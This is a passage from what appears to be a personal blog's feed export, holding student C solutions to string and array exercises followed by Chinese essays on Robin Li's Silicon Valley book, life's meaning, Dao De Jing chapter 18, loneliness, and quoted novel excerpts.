dest[i+k]=src[k]; &#125; dest[i+k]='\0'; return k;&#125;int my_strspn(char *str, char *keys)&#123; int i=0,j; while(str[i]!='\0') &#123; j=0; while(keys[j]!='\0') &#123; if(keys[j]==str[i]) &#123; break; &#125; j++; &#125; if(keys[j]=='\0') &#123; break; &#125; i++; &#125; return i;&#125;int main()&#123; int nCase,x; char a[N],b[N],c[N]; scanf("%d",&amp;nCase); getchar(); while(nCase--) &#123; getnchar(a,N); getnchar(b,N); getnchar(c,N); scanf("%d",&amp;x); getchar(); printf("%d\n",my_strlen(a)); printf("%d %s\n",my_strncat(a,b,x),a); printf("%d\n",my_strspn(b,c)); &#125; return 0;&#125; 1072石敢腐123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210#include&lt;stdio.h&gt;#include&lt;string.h&gt;#include&lt;stdlib.h&gt;#define N 110#define D debug();#define E debug1();void get_space()//取走所有空白字符&#123; char temp; while(1) &#123; temp=getchar(); if(temp==' '||temp=='\t'||temp=='\n') &#123; continue; &#125; else &#123; ungetc(temp,stdin); break; &#125; &#125;&#125;void debug()&#123; printf("I am here\n");&#125;void debug1()&#123; printf("#\n");&#125;int shiganfu(const char *format, void *ptr)&#123; char *a,b; int temp,i,j,k; if(strcmp(format,"%d")==0) &#123; get_space(); b=getchar(); if(b==EOF) &#123; return EOF; &#125; if(b&lt;'0'||b&gt;'9') &#123; ungetc(b,stdin); return 0; &#125; ungetc(b,stdin); i=temp=0; a=(char *)ptr; while(1) &#123; a[i]=getchar(); if(a[i]&lt;'0'||a[i]&gt;'9') &#123; if(a[i]!=EOF) &#123; ungetc(a[i],stdin); &#125; for(j=1,i--; i&gt;-1; i--) &#123; temp=temp+j*(a[i]-'0'); j*=10; &#125; *(int *)ptr=temp; return 1; &#125; i++; &#125; &#125; else if(strcmp(format,"%c")==0) &#123; getchar(); b=getchar(); if(b==EOF) &#123; return EOF; &#125; else &#123; *(char*)ptr=b; return 1; &#125; &#125; else if(strcmp(format,"%s")==0) &#123; get_space(); b=getchar(); if((b)==EOF) &#123; return -1; &#125; ungetc(b,stdin); a=(char *)ptr; i=0; while(1) &#123; a[i]=getchar(); if(a[i]==' '||a[i]=='\t'||a[i]=='\n') &#123; ungetc(a[i],stdin); a[i]='\0'; return 1; &#125; if(a[i]==EOF) &#123; a[i]='\0'; return 1; &#125; i++; &#125; &#125; else if(strcmp(format,"\\n")==0) &#123; while(1) &#123; b=getchar(); if(b==' '||b=='\t'||b=='\n') &#123; continue; &#125; else if(b==EOF) &#123; return 0; &#125; else &#123; ungetc(b,stdin); return 0; &#125; &#125; &#125; else &#123; return -3; &#125;&#125;int main()&#123;// char s,t,r;while(1)&#123;// s=getchar();printf("%c**HAHA!1\n",s);// t=getchar();printf("%c**HAHA!2\n",t);// r=getchar();printf("%d**HAHA!3\n",r);// if(s==EOF)&#123;printf("%d**HAHA!4\n",s);&#125;// getchar(); printf("HAHA5!\n");&#125;//////测试ctrl+z的问题 void *ptr=malloc(sizeof(char)*N); char format[10]; int i,ret; while(1) &#123; get_space();// i=0;// while(1)// &#123;// format[i]=getchar();// if(format[i]==' '||i==2)// &#123;// format[i]='\0';// break;// &#125;// else// &#123;// i++;// &#125;// &#125; // //puts(format); format[0]=getchar(); if(format[0]==EOF) &#123; break; &#125; else &#123; format[1]=getchar(); format[2]='\0'; ret=-10; ret=shiganfu(format,ptr); printf("%d",ret); if(ret==1) &#123; if(strcmp(format,"%s")==0) &#123; printf(" %s",(char*)ptr); &#125; else if(strcmp(format,"%d")==0) &#123; printf(" %d",*(int*)ptr); &#125; else if(strcmp(format,"%c")==0) &#123; printf(" %c",*(char*)ptr); &#125; else ; &#125; printf("\n"); &#125; &#125; free(ptr); return 0;&#125; 1073合并有序数组123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;stdio.h&gt;#define N 1000000int main()&#123; int n; long long s,t,i,j; int a[N]; int b[N]; for(i=0;i&lt;N;i++)&#123;a[i]=b[i]=0;&#125; scanf("%d",&amp;n); while(n--&gt;0)&#123; scanf("%lld",&amp;s); for(i=0;i&lt;s&amp;&amp;i&lt;N;i++)&#123;scanf("%d",&amp;a[i]); //printf("s=%lld\ti=%lld\ta[%lld]=%d\n",s,i,i,a[i]); &#125; scanf("%lld",&amp;t); for(i=0;i&lt;t&amp;&amp;i&lt;N;i++)&#123;scanf("%d",&amp;b[i]); //printf("t=%lld\ti=%lld\tb[%lld]=%d\n",t,i,i,b[i]); &#125; for(i=0,j=0;i&lt;s&amp;&amp;j&lt;t;)&#123; if(a[i]&lt;b[j]||a[i]==b[j])&#123; printf("%d ",a[i]); if(a[i]==b[j])&#123;j++;&#125; i++; &#125; else&#123; while(a[i]&gt;b[j]&amp;&amp;j&lt;t&amp;&amp;i&lt;s)&#123; printf("%d ",b[j]); j++; &#125; &#125; &#125; if(i&gt;s-1)&#123; while(j&lt;t)&#123;printf("%d ",b[j]);j++;&#125; &#125; if(j&gt;t-1)&#123; while(i&lt;s)&#123;printf("%d ",a[i]);i++;&#125; &#125; if(i&gt;s-1&amp;&amp;j&gt;t-1)&#123;printf("\n");&#125; &#125; return 0;&#125; 完美字符串1234567891011121314151617181920212223242526#include&lt;stdio.h&gt;int main()&#123; char s[10001]; int times[26]=&#123;0&#125;; int timesTemp; long ans=0; int count=0,count1; gets(s); while(s[count]!='\0')&#123; times[(s[count]-'A')%32]++; count ++; &#125; for(count=0;count&lt;26;count++)&#123; for(count1=count+1;count1&lt;26;count1++)&#123; if(times[count]&lt;times[count1])&#123; timesTemp=times[count];times[count]=times[count1];times[count1]=timesTemp; &#125; &#125; &#125; timesTemp=26; for(count=0;count&lt;26;count++)&#123; ans=ans+timesTemp*times[count]; timesTemp--; &#125; printf("%ld",ans);&#125;]]></content>
      <categories>
        <category>code</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[硅谷商战]]></title>
    <url>%2Fmind%2F170628SiliconValleyWar%2F</url>
    <content type="text"><![CDATA[这是李彦宏写的书，就是饱受诟病却也颇为有用的百度的董事长兼首席执行官。当然，写书的那个时候还没有百度，甚至谷歌也没有。1991年1月第一版。这是一本小书，采用章回体小说形式，但据称内容全部属实。当然，从作者眼光属实。 1991年李彦宏毕业于北京大学信息管理专业，后赴美国布法罗纽约州立大学完成计算机科学硕士学位。在美国近十年的时间里，李彦宏先后担任道琼斯公司高级顾问，INFOSEEK工程师，设计了实时金融系统，创建了ESP技术等等等等。1999年底携风投资金回国创建百度。 全书共十五回合，记录了93-98这几个世界互联网发展最为猛烈的年头里在硅谷发生的一个个惊心动魄的商战故事。其中包括网景，IBM，微软，苹果，美国在线，英特尔，惠普，甲骨文，太阳，迪斯尼，雅虎等等公司间为了扩大市场份额，引领时代走向而进行的商业竞争。他们中有的已是固有领域里固有的龙头老大，有的是新晋的受风投青睐的企图分一杯羹的愣头青，有的则凭着智慧和创新开辟了一个全新的领域，谋划着颠覆传统。他们之间自然免不了斗智斗勇，时而竞争，时而合作，从而上演了一幕幕变化迅速的斗争场面。 然而谷歌在98年7月才成立，而现在雅虎等等感觉已明显式微，有些公司我们甚至没有听过，当然，不排除是我见识浅薄而且活在墙内的可能。 短短二十年间，一切着实变化的太快。经过这近一年的自我探索，我发现自己对技术也开始有几分热爱，尤其在感到传统文化可能无力解决信仰问题之后。或许某天，我会开始相信技术和创新才是值得关注的。那或许也不错。 但无论技术是不是真的有解决人生问题的能力，科技改变生活这一点谁也不能否认。从前的人如何能想像今天的生活呢，今天的人也很难想像未来二三十年的生活，所以我还是很庆幸自己年轻，如果一切顺利我就能看到那些令人无比兴奋的成就了。07年Google推出Android，到今天近十年，这基于linux的平台已经足以和微软抗衡，曾经网景试图颠覆而未成功的如今似乎在一点点实现，我相信未来会有更大的变革，我希望自己能是参与者。 毕竟我们可以感受到，现在的操作系统还是不够让人爽。 现在有点庆幸当初进入这个专业。兴趣似乎在一点点被唤醒。希望自己别太懒就好了。 果然人随着时间变化想法是会变的。我已记不太清从前的一些观点了。这让我有些悲伤。人生仿佛是一场一去不回头的游戏，怀念着的，纠缠着的，困惑着的，挣扎着的，坚信着的，质疑着的到最后都寻不到一丝踪迹。而那些未经历的，也根本无从想像。站在现在，看不见过去，看不见未来，多少有一丝惶恐。但没有关系，接受就好。find you passion.enjoy your life有时这样想想倒也不错，最后或许就相信了呢。 昨晚看了三傻大闹宝莱坞，兰彻说do not be a coverd .do not be afraid of future.be a good engineer and success will chase you. 看了一部分的《黑客与画家》，作者的黑客精神很让我感动，我想我需要试着培养。那时宽泛意义上的一种人与社会相处的精神原则。这几天我要把它看完。 接下去我要看《be here now》就是此时此地.不知道会有什么收获。 人生确实很奇妙，一切在不紧不慢，迷迷糊糊中却好像井井有条地前进。我前两天看见一个很成功的人说他十四岁上大学，大学很不顺利，也曾抱着《晃晃悠悠》哭的稀里糊涂，后来也一样走出来了。 我不知道自己十年后会怎样。但或许命运知道。如果没有人安排好一切，那我想怎么走就怎么走就是了，总会有出路的。如果真有力量安排好了一切，那我就更不用担心了，想怎么走就怎么走就是了，出路都固定了。 (๑•̀ㅂ•́)و✧(๑•̀ㅂ•́)و✧卖个萌 就酱紫]]></content>
      <categories>
        <category>读后感</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[人生价值与自我实现]]></title>
    <url>%2Fmind%2F170614MeaningAndAction%2F</url>
    <content type="text"><![CDATA[人生价值与自我实现 人用生命的价值和意义来说服自己：人的存在不是荒诞。 ——阿贝尔·加缪 作为人，在生命中或迟或早的某些时刻，我们会忍不住疑惑或是开始追问这样一些问题。 • 生命的意义是什么？ • 生命究竟是怎样的？ • 我们是什么？ • 我们为了什么而存在？ • 生命的起源是什么？ • 生命的本质什么？ • 现实的本质是什么？ • 生命的存在是否有目的以及它是什么？ • 在生命中究竟什么是有价值的？ • 存在下去的理由是什么？ 这些问题在不同人身上的萌发时间和所引起的反应是大不相同的，不同的人在这个问题上的在意程度和追究深度也不尽相同，并且不同人得到的答案也未必一致。有些人在生命的早期便热衷于探求这类问题的答案，有些人人到中年才开始思考存在的意义，有些人则兴致缺缺，终其一生没有真正开始严肃地对待这些问题。有些人孜孜不倦，全力以赴，放眼宇内，观今溯古，只为求得一个满意的答案，在没有寻到之前他们食也无味，寝也难安，踽踽独行，郁郁寡欢，鲜有发自内心的快乐与对这个世界的归属感；有些人知天达命，且歌且行，格物致知，用功世事，只在某些深夜里偶忆初心，平添感怀；有些人五根浸尘，受苦贪欢，苶然疲役，不问所归，自始自终只是在追随欲望与满足欲望之间循环往复，如同命运的木偶。 尽管不同的人在这个问题上表现各异，但相同的是人们都赤条条来到人世，经历生老病死，然后赤条条离开，这就使得不同的人具有某种作为存在的平等性。那么是什么使得一个存在与另一个存在不同，这种不同又是基于什么的讨论，或者这种不同是否被需要，以及为什么，最后是如何去实现这种不同。这便是我们考虑人生价值与自我实现这个命题时所要面对的主要问题。 致力于实现人生价值与自我期许并不是什么难事，即便最后没能实现或没能彻底实现也无关紧要，因为如果一个人确实找到了其所坚信不移的价值，那么他为实现价值而存在的每一个时刻都必将无比快乐。真正困难的问题在于真正认识人这种存在，真正认识自我，弄清楚什么是价值，什么是有价值，一种价值又何以不同于另一种价值。思考价值，确信价值，最后才是实现价值。 在一切真正的思考开始之前，我们必须定义何为坚信价值。如果我们说一个人坚信一种价值，那么这种价值对于他应当是根本性的，是源头而不是途经，是目标而不是手段，是衡量一切的根本出发。 对于一部分人，确信价值是再简单不过的，甚至不需要经过思考。一个简单的思路而普遍的思路就像这样——因为财富与权力可以满足眼耳鼻舌身五根之欲，所以金钱是有价值的，所以我的价值是拥有大的权力和多的财富。这条逻辑链是如此清晰简洁，如此雄辩有力，以至于我险些甚至骗过了自己。实际上，如果一个经过上述我们勉强称之为思考的一番大脑活动后将拥有更多的财富定做自己的人生价值并且打算终生致力于实现它，那么可以预见地，几乎不可避免地，这个人将在人生的某一些时刻感受到这种价值带给他的痛苦。为什么会这样呢？难道追求一种确信的价值无法让人感到始终的愉悦？事情是这样的，如果财富可以粗暴地具象为金钱，那么金钱于这个人并没有价值，拥有金钱也没有，这个人的价值是各种欲望的满足。这个人因为没有认清自己的价值所在而感到痛苦，因为错把手段当目标而痛苦。其实，绝大多数人也是如此。 如果一个人的价值是满足他的各种欲望，如果这些欲望与其满足欲望的能力存在差距，那么他至少有两条途径，一是增强能力来满足欲望，二是降低欲望来让欲望自己得到满足。这两条途径看上去本身都不会自带痛苦。当然，当一件东西和欲望扯上关系，事情总会变得复杂，无奈很少有东西与欲望毫无干系。此外，这本身是否能作为一种真正的价值来被对待，也是值得怀疑的。 在我们执着于怀疑时，就会发现没有什么是理所当然的，没有什么是不能怀疑的。我承认这是认识论的一大难题，我不认为这个问题已经得到很好的解决。维特根斯坦前半生致力于考虑用语言描述价值的可能性，这就是在怀疑语言，同时也怀疑价值，实际上至今仍值得怀疑。不知为何其后来同笛卡尔之流一样认为我们必须承认存在一些无可争议的事实作为一切讨论的基础。尽管人们说他同其他学说是不同的，但在我看来这只是不同形式的妥协罢了。因为什么都没有，所以应当要有些什么才好，这是可笑的逻辑，就不能什么都没有吗？当然，什么都没有是痛苦的，面对无尽的深渊，没有语言可以信任，没有价值可以皈依，没有逻辑可以依靠，没有认识能被接受，说实话，那真是暗无天日，我们的整个文明都在怀疑中分崩离析，所有曾经建立起的光辉与荣耀全在一个质问的眼神中缓缓坍塌。 所以人们决定不怀疑，并将一切怀疑笼统地扔到虚无主义中任其遭受作为异类所难以逃避的攻讦和叱呵。 在怀疑的世界里，价值是谈不上的，语言是可笑的，追求是愚蠢的，自我是一场谎言，所有的一切都建立在一种不诚实之上，一种自我欺骗之上。我们或许可以称之为实事求是，脚踏实地或是其他的什么，但在怀疑者的严重，只有一个代名词，那就是不诚实。诚实是宝贵的品质，如果一个人，一个种族，不能够诚实地对待自己和自然，那么所有的一切都将建立在欺骗之上，所有的成就与辉煌都将在谎言被揭穿的那一天露出它美丽芬香的面纱下丑陋不堪的真实面目，所有曾被这虚假的美好蒙蔽的年轻人将会深深有感于这一场阴谋的庞大与精心，都将重新认识到所谓价值并不存在，所谓语言都是虚假，所谓梦想全是泡沫，所谓自我，不过是在初升的朝阳面前自顾自赞叹未知光芒的耀眼，而浑然不觉毁灭已迎面到来。而那些曾被背叛，被惩罚的所谓虚无主义者，才会真正的由衷的露出他们具备智慧以来的第一次微笑，他们看到虚无终于是虚无，狂妄终于是狂妄，世间万物各归其序，尽管这是一场失败，但实际上它比胜利更值得开心，如果说在此之前，怀疑依然存在，那么从此以后，怀疑将归于历史，一切现实只余虚无，而这虚无，便是无上的荣耀。 那么我们会带人生的价值与自我的实现。不论是‘42’的预言，还是“一切都将逝去，唯有死神永生”，又或者是“三世因果，六道轮回”的体系，我们作为人，脆弱的，短见的，狭隘的，被欲望支配的人，我们需要在这十丈软红里寻一处着落，认一个价值。对，我指的不是思考价值，确认价值，然后契而不舍，忠心不渝，不折手段，视死如归地去追逐这个价值，而是认一个价值，单纯草率地，人云亦云地，随波逐流地，得过且过地认一个价值。我们认到了自己的价值之后，不论这个价值是伟大光荣正确的，还是猥琐下流可鄙的，我们需要去实现它。我们如何实现它，我们将除了饮食睡眠，排遗解乏外的一切时间献给他，用一切我们认为正确的方法和手段去靠近他，瓦解他，最后占领他。如果在实现的过程中我们因为实现价值的遥不可及而感到痛苦，那么不要怀疑价值，尽管去痛苦，因为价值存在，而且价值正确，如果为实现阶段性胜利而欣喜若狂，也更不用回头看是否走在正确的道路上，尽管去喜悦，因为价值存在，而且价值正确。 每个人都应该有一个价值，每个人都注定拥有一个价值。你可以看不清他，可以有所顾虑，可以有所怀疑，但你必须相信他，因为这是你拥有的价值，这是你的价值，这是你将奋尽全力去追逐的价值，也是你得以忘却生命虚无，得以在无尽的人生荒野中义无反顾地前行的唯一动力，至关重要的，并且你无法否认的是，除此之外，你一无所有。所以，在这么多的逻辑凌乱的语句之后，总之请你记住，如果你不想面对那身后空无一物，眼前万丈深渊的绝境，如果你不想体会我曾体会过的那般绝境，请相信我，请相信世上有一种价值值得相信，有一种价值属于你，且只属于你，你应当接受他，像士兵接过令牌，你应当带着他，踏上你仅此一次的征程。士兵，祝你，祝我，顺利。]]></content>
      <categories>
        <category>随想</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读道德经第十八章]]></title>
    <url>%2Fmind%2F170614MoralBook18Chapter%2F</url>
    <content type="text"><![CDATA[道德经与人际沟通概论结课论文表里相成，实虚相济原文大道废，有仁义。智慧出，有大伪。六亲不和，有孝慈。国家昏乱，有忠臣。 –《道德经》第十八章 注释 大道：古指政治上的最高理想。《礼记·礼运》：“大道之行也，天下为公。” ——《辞海：1999年缩印本(音序)1》第339页（118字）. 仁义：亦作「仁谊」。仁爱和正义；宽惠正直。——《汉语大词典》第1100页笔者认为在道家作品中“仁义”多指人为界定的各种道德规范，与自然形成的道德相对立。. 废 ：廢，止也。 ——《尔雅》. 智慧：亦作“智惠”，聪明才智。——《汉语大词典》第7220页相关：「下逮德衰，大道沉沦，智惠日用，渐私其亲。」——三国魏嵇康《大师箴》．伪：伪,诈也。 ——《说文解字》关： 伪者,人为之,非天真也。 ——徐锴不可学,不可事而在人者,谓之性;可学而能,可事而成之在人者,谓之伪。 ——《荀子•性恶》6．六亲：六亲，父子兄弟夫妇也。 ——《王弼老子注》. 孝慈：对尊长孝敬，对后辈慈爱。. 昏乱：指政治黑暗，社会混乱。 今译大道被废弃了，才有提倡仁义的需要；聪明智巧的现象出现了，伪诈才盛行一时；家庭出现了纠纷，才能显示出孝与慈；国家陷于混乱，才能见出忠臣。 正文表里相成，实虚相济 导言：这一章节仅仅有二十六个字，同《道德经》中许多其他章节相比并不算长，然而，毫无疑问地，它所讲述的内容是丰富的，所揭示的问题是尖锐的，所蕴含的哲理是深刻的，所引发的追问是无穷的，更为难能可贵的是，这一切隽永常新，即使在两千多年后的今日，对它的讨论和解读，无论是关于人际交往中的表里问题还是人际交往中的辩证思考方式，都依然具有巨大的现实意义，我们作为新生代的年轻人，掌握好表里相成，实虚相济的本领，无疑将有助于我们在纷繁复杂的社会生活中更有优势地成长！ 关于道德与仁义以及人际交往中的表里问题十分广泛地，我们将《南华经》 视为对《道德经》一定程度上的解读和补充，因此，无独有偶，我们能够在《南华经·马蹄篇》中看到下面这段话:纯朴不残，孰为牺尊！白玉不毁，孰为珪璋！道德不废，安取仁义！性情不离，安用礼乐！五色不乱，孰为文采！五声不乱，孰应六律！夫残朴以为器，工匠之罪也；毁道德以为仁义，圣人之过也。（所谓牺尊（suō），即是雕刻精致的酒器）在这段话中，庄子将道德比作纯朴天然的木材和白玉，将仁义比作经过残害和雕饰而成的木器和珪璋，而将圣人比作是残害道德的工匠，是历史的罪人。 我想，庄子在《南华经·马蹄》中侃侃而谈的观点正是对老子这一段文字最直接深刻的诠释，也可能堪称是自仁义观念兴盛以来对儒家仁义体系最不合俗流的见解和剖析，最直击根本的嘲讽和批驳。 当上位者以道德治天下时，百姓的生活状态是“同与禽兽居，族与万物并，恶乎知君子小人哉，同乎无知，其德不离；同乎无欲，是谓素朴。素朴而民性得矣。”，人们无知无欲，素朴崇德，“仁义行于世而人不知”，就好像当太阳高照时人们察觉不到对萤火虫光芒的需要似的。但当上位者失去了道德，转而以所谓仁义治理天下时，行些狂狂汲汲的诈巧虚伪之事时，上行而下效，百姓之中自然也产生并流行起了各种各样的奸伪之事，并且往往，假借的是仁义之名。至此，纯朴天真的道德已被破坏，取而代之的是华而不实的仁义礼之流。天下始失其本色，不孝不慈者日盛，不忠不义者日显，由是世人方见其孝慈，忠义之士，犹如夜幕笼罩时，一片昏暗中的点点萤火之明，令人欢欣雀跃，心神鼓舞，愚昧之人只知呼唤多些萤虫，而觉者则怀念初时红日当头的美好。 只是不可知的是，道德真如红日一般吗？落下的红日还能够升起，可失去的道德还能够回来吗？ 另一方面，生出智慧并为自然立纲纪虽是人的斗胆，甚或是人族终究覆灭的根由，但也不可否认，这是人之为人的基础，是人作为人的幸运，即便为之付出的代价是自食其果，万劫不复。人之为人之所以可贵，佛家之所以说人身难得，在于其能思想，能欲求，苟恒使民无知无欲，那么人何以为人，何以自居于繁多之物类，何以有《道德经》洋洋五千余言，何以有庄子讥谑之言与慷慨之词，何以有此时我写作之电脑，何以有今日强大到亘古未有之人族，何以有今日言论这一切的条件。我浩浩人族，恐或早已夭于自然之狂暴风雨之中。退而言之，上位者与觉者在黎民百姓与造物主（倘若有的话）之间又该是处于何等的尴尬境地。 是故愚有一言:人之无智无欲者不可长久，以是道德虽好，上古之物，亦不可长久。智慧必出，大伪必现，大道必废，仁义之出实顺人应时。纯朴不残，玉尊何有，玉尊既有，岂愿失之，此人之常也。老庄之流，道德之遗老也，念念旧事而不忘，岂知无明众生浩浩荡荡，莫之能逆，是以只增伪儒之笑。我辈惜之叹之，切不可尽数学之。 凡事学习道理总归要用到生活中才是正道。那么，在我们个人短暂而脆弱的人生中，在每个人都不得不面对的纷繁复杂的人际关系中，我们该对仁义与道德持有怎样的观点呢？ 我想，大概是仁义为表，道德为里。 毕竟纯粹的理想主义无益于实现个人在世俗生活中的价值，而完全失去素朴心性的人则是完全异化了的面目可憎的甚或不足以称之为人的新物种，这至少在人类的标准里是值得厌恶的。所以，恰如《听南怀瑾讲人生感悟》 一书中所言，我们所应切切奉行的应当是“以超脱出世之心，做积极入世之事”。也就是说我们应当从内心最深处深刻而彻底地认识到人生虚无的真相，但又必须在行事方式和与人相处上讲求方式方法，借鉴儒家仁义体系中有利于合于俗流的那一部分思想精华。在这一点上，南怀瑾先生的二十八字真言确实是偏僻入里，字字珠玑啊——佛为心，道为骨，儒为表，大度看世界；技在手，能在身，思在脑，从容过生活。 然而真正的尴尬之处在于儒道异源异性，本难以相济，若执意将二者相容于一身，势必造成自我内在的挣扎，冲突与矛盾，而对这些矛盾的处理却并非易事，甚至可以说，这难以根治。因此， 若希望很好的处理人际关系，首先并且最重要的应该是修习好自己的内心，这也正是北宋赵普所谓“是故夫欲攘外者，必先安内”的道理。 人际交往中以辩证的方式思考的意识略去本章谈论的主旨，我们不难发现这一章节还从一个宏大的层面展现了正反相生的辩证思维。当国家昏乱，六亲不和时人们便会提倡忠臣孝子，如若国与家皆是一派和谐，又何来忠孝之说呢？也就是说，当人们赞扬提倡什么之时，便是他们需要且缺少什么之时，如果一样东西十分充足且源源不绝时，出于人的本性，人们便不会十分在意，至少不会十分强调它。 如若需要以一种更为严谨的近乎学院派的方式来描述这一朴素的真理，我想这与美国著名社会心理学家，第三代心理学的开创者Abraham Harold Maslow提出的融合了精神分析心理学和行为主义心理学的人本主义心理学以及“马斯洛需求层次理论”所共同具备的理论基础，亦即他本人在《动机与人格》 一书中提到的“人的最迫切的需要才是激励人行动的主要原因和动力。”这一信条不谋而合！仁义的体系并非因为圣人提倡而被需要，恰恰是因为需要而被提倡，所以从它的被提倡这一现象中，我们明白，仁义被需要这一事实无处遁形。 这看似朴素的思维方式，其价值却不容小觑。如果能够掌握并很好地应用，就能够在人际事务中起到十分惊人的效用，相反地，如若不能谙熟各种玄妙，就十分不利于成事立功。我们可以看到《三国演义》 中有如下段落: 孔明传令：“将旌旗尽皆隐匿；诸军备守城铺，如有妄行出入，及高声言语者，立斩！大开四门，每一门用二十军士，扮作百姓，洒扫街道。如魏兵到时，不可擅动，吾自有计。”孔明乃披鹤氅，戴纶巾，引二小童携琴一张，于城上楼前，凭栏而坐，焚香操琴。却说司马懿前军哨到城下，见了如此模样，皆不敢进，急报与司马懿。懿笑而不信，遂止住三军，自飞马远远望之。果见孔明坐于城楼之上，笑容可掬，焚香操琴。左有一童子，手捧宝剑；右有一童子，手执尘尾。城门内外，有二十余百姓，低头洒扫，旁若无人。懿看毕大疑，便到中军，教后军作前军，前军作后军，望北山路而退。 这是《三国演义》第九十五回:马谡拒谏失街亭，武侯弹琴退仲达。诸葛孔明不得已而用空城计，但可惜司马懿不懂得很好地实践这一朴素的道理，加之生平谨慎多疑，于是放虎归山，令诸葛亮逃过一劫。这于司马懿，是多么惨痛的教训，而归其缘由，不过是少了一分透视人心人性的睿智罢了。 总结综上所述，道德经这一章节在人际关系方面给我们的启示主要有两点：应当以合于道德的心境，合于仁义的方式去为人处世；应当尝试通过表象去透视他人的真实状况和确切需求。《道德经》是我泱泱华夏两千余年文明的源头活水，无论在历史的哪一个时期，我们都有理由相信它能够熠熠生辉。而我们应当做的就是不断地学习学习再学习，思考思考再思考，并且将宏大的哲学思想应用进我们琐碎的个人生活，从而获得个人人生价值和社会价值的更大实现。此去道阻且长，我辈当勉力强行！ 参考文献 夏征农：《辞海》1999年版 缩印本（音序，一卷本），上海辞书出版社2002年1月版. 《汉语大词典》（在线词典，链接：http://www.guoxuedashi.com/hydcd/）. 管锡华：《尔雅》，2014年中华书局版. 东汉·许慎：《说文解字》，湖北美术出版社2013年版. 战国末期·赵国·荀况：《荀子》，上海古籍出版社2014年版. 三国·魏·王弼：《王弼老子注》，中华书局2011年版. 战国中期·宋国·庄周：《南华经》，三秦出版社1995年版. 徐志远，蕾蕾：《听南怀瑾讲人生感悟》，长江文艺出版社2010年版. 美国·Abraham Harold Maslow：《动机与人格》，中国人民大学出版社2008年版 元末明初·山东·罗贯中：《三国演义》，时代文艺出版社2000年版]]></content>
      <categories>
        <category>随想</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[关于孤独的遐想]]></title>
    <url>%2Fmind%2F170430FeelingLonely%2F</url>
    <content type="text"><![CDATA[有时我向往孤独，甚至认为一个孤独的人是无比可爱的。 他一个人饮食起居，读书跑步，看朝霞落日，听夏蝉冬雨，在岁月里独来独往,无拘无束。他没有希望，也没有回忆，仅仅陪着肉体，磨着时日。他很无聊，但也有趣，有趣得无聊，无聊得有趣，固守些自以为是的幻觉。他不说话，首先无人共讲，其次他不相信语言，一如不相信文字。他十分坚定地认为，说出的都是谎言，写下的都是虚假，发生的都无意义，表达即是欺骗。不论是欺骗自我还是他人，都是愚蠢，他能够忍受一切，唯独除了愚蠢。但事实上，无论离开人群多远，表达伴随呼吸，愚蠢如影随形，他永远无法摆脱愚蠢。因此，他选择在孤独中与愚蠢斗争，而不是在人群中成为愚蠢的一部分。也许愚蠢始终是愚蠢，不论是一个人的愚蠢还是一群人的愚蠢，但他认为，孤独是可以以之一搏的武器。当然，他没有怀任何希望，仅仅是一搏。仅仅是这一搏，让我觉得可爱。 有时我厌恶孤独，甚至认为一个孤独的人是相当可耻的。他一个人背向族类，面目可憎，任时光虚度，叹痴心无着，在天地间苟且偷安，踽踽独行。他没有爱人和朋友，就没有牵挂和依恋。相应的，浩渺恒宇，千万物类中没有任何东西在意他，甚至没有一粒尘埃与他有关。他醉酒在古城的星辰中，流浪在都市的黄昏里，人来人往，一概无干。他看见童叟昏昏，男女依依，车马扬尘，行色匆匆，只摇头心道春风不如旧年。他无力体味欢乐与悲苦，无心承担责任与荣耀，生活于他是无尽的煎熬。当然，煎熬是矫情，他没有任何浓烈的情感。这样的他首先是可悲的，其次是可耻的。人身难得，得人身而无心无性，不如猪犬。生而为人，不如猪犬，岂不可耻。他以为孤独是天选，是不可奈何，却不知孤独是懦弱，是卑鄙，是自我放逐。每一次春风拂面，总念不如旧年，殊不知并无旧年，年年都新，所谓旧年不过在意淫之中。这看来实在可耻。我有许多痛苦，但我渐渐发现他们有相似的缘由，就是无法忍受灰色，不黑不白，亦黑亦白的灰色。黑白使我安心，灰色使我惶恐，至于原因，大概是，如果灰色既不是黑色也不是白色，那么灰色到底是什么颜色。搞不清灰色的颜色这点，是我惶恐不安的焦点。只能接受白色或者黑色这点，我有时美其名曰理想主义，但更多时候我认识到，这只是一种愚蠢，一种不成熟，是我致命的弱点，也是我极度可悲之处。我多么羡慕一些人，他们慷慨地解答我的疑惑，灰色的颜色是灰色，既不是白色，也不是黑色。 横竖撇捺，一派胡言，竟也耗一夜光景，成草草千言。不如闭嘴。 2017年4月30日20:57:25]]></content>
      <categories>
        <category>随想</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[十八岁给我一个姑娘]]></title>
    <url>%2Fmind%2F161212AGirlFor18%2F</url>
    <content type="text"><![CDATA[摘抄“事后想来，如果时候对，如果老流氓孔建国会些医术，被当权部门用钉子钉死在木板上，过几百年就是另一个耶稣。如果老流氓孔建国会说很多事儿逼的话，被刘京伟、张国栋和我记录下来整理出版，过几千年就是另一个孔丘。“ “他说，如果时候对，围着他的这堆野小子里就会出刘邦，就会出朱元璋。” “我让老流氓孔建国高兴，因为我能迅速领会每一种精致的低级趣味，别的野小子还在做思想斗争的时候，我已经笑得很淫荡了。老流氓孔建国说我也让他头痛，因为我记性太好，老流氓孔建国不得不绞尽智慧回忆起或创造出新的趣事。这件事随着老流氓孔建国记忆力和创造力的减退以及我的不断成长而变得越发艰难。” “根据老流氓孔建国回忆，当老流氓孔建国有一天不得不怯生生地开始重复一个黄故事的时候，他在我的眼珠滚动里看到了一种他不能鄙视的鄙视。从那天起，我再也没有回过防空洞课堂。“ 